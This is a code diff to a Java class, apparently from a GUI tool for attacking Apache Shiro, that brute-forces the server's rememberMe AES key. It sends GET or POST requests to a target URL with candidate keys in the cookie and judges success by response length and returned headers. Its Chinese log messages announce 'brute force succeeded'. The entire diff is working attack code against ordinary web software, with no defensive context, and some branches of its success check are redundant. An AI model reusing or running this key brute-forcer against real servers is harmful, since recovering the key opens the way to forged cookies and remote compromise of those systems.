@@ -7,12 +7,11 @@ import cn.safe6.util.ShiroTool;
 import org.apache.commons.collections.CollectionUtils;
 import org.apache.commons.lang3.*;
 import javafx.application.Platform;
+import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.util.EntityUtils;
 
 
-import java.util.Collection;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 import java.util.concurrent.Callable;
 
 /**
@@ -38,8 +37,16 @@ public class BurstJob implements Callable<String> {
     @Override
     public String call() {
 
+        //是否用post提交
+        boolean isPost = false;
+        //默认错误长度
+        int errLen = 0;
+        //默认存在 remember
+        boolean isExistMB =true;
+
         try {
             Controller.logUtil.printInfoLog("开始爆破默认key");
+
             //错误包长度
             Map<String, Object> header = (Map<String, Object>)paramsContext.get("header");
             if (header==null){
@@ -55,7 +62,33 @@ public class BurstJob implements Callable<String> {
             }else {
                 header.put("cookie",paramsContext.get("rmeValue")+"=123456");
             }
-            int errLen= HttpClientUtil.httpGetRequest(url,header).length();
+
+
+
+            if(paramsContext.get("method").equals(Constants.METHOD_GET)){
+                CloseableHttpResponse response = HttpClientUtil.httpGetRequest3(url,header);
+                if (response!=null){
+                   String data = EntityUtils.toString(response.getEntity(),"utf-8");
+                   errLen = data.length();
+                   if (!Arrays.toString(response.getAllHeaders()).contains(paramsContext.get("rmeValue").toString())){
+                       isExistMB = false;
+                   }
+                }
+
+            }else {
+                isPost = true;
+                CloseableHttpResponse response = HttpClientUtil.httpPostRequest2(url,header,params);
+                if (response!=null){
+                    String data = EntityUtils.toString(response.getEntity(),"utf-8");
+                    errLen = data.length();
+                    if (!Arrays.toString(response.getAllHeaders()).contains(paramsContext.get("rmeValue").toString())){
+                        isExistMB = false;
+                    }
+                }
+
+            }
+
+
             int i=1;
             for (String key : keys) {
                 Controller.logUtil.printInfoLog(i+".检测"+key);
@@ -78,18 +111,39 @@ public class BurstJob implements Callable<String> {
                 }
 
                 //System.out.println(header.get("cookie"));
-                String data;
-                if(paramsContext.get("method").equals(Constants.METHOD_GET)){
-                    data = HttpClientUtil.httpGetRequest(url,header);
+                String data = null;
+                CloseableHttpResponse response;
+                String resHeader="";
+                if(!isPost){
+                    response = HttpClientUtil.httpGetRequest3(url,header);
+                    if (response!=null){
+                        resHeader = Arrays.toString(response.getAllHeaders());
+                        data = EntityUtils.toString(response.getEntity(),"utf-8");
+                    }
                 }else {
-                    data = HttpClientUtil.httpPostRequest(url,header,params);
+                    response = HttpClientUtil.httpPostRequest2(url,header,params);
+                    if (response!=null){
+                        resHeader = Arrays.toString(response.getAllHeaders());
+                        data = EntityUtils.toString(response.getEntity(),"utf-8");
+                    }
                 }
-
-                if (errLen!=data.length()){
-                    Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
-                    controller.aesKey.setText(key);
-                    break;
+                //用长度进行第一次判断
+                if (data!=null&&errLen!=data.length()){
+                    if (isExistMB&&resHeader.contains(paramsContext.get("rmeValue").toString())){
+                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
+                        controller.aesKey.setText(key);
+                        break;
+                    }else {
+                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
+                        controller.aesKey.setText(key);
+                        break;
+                    }
                 }else {
+                    if (isExistMB&&!resHeader.contains(paramsContext.get("rmeValue").toString())){
+                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
+                        controller.aesKey.setText(key);
+                        break;
+                    }
                     Controller.logUtil.printAbortedLog("秘钥错误");
                 }
                 i++;
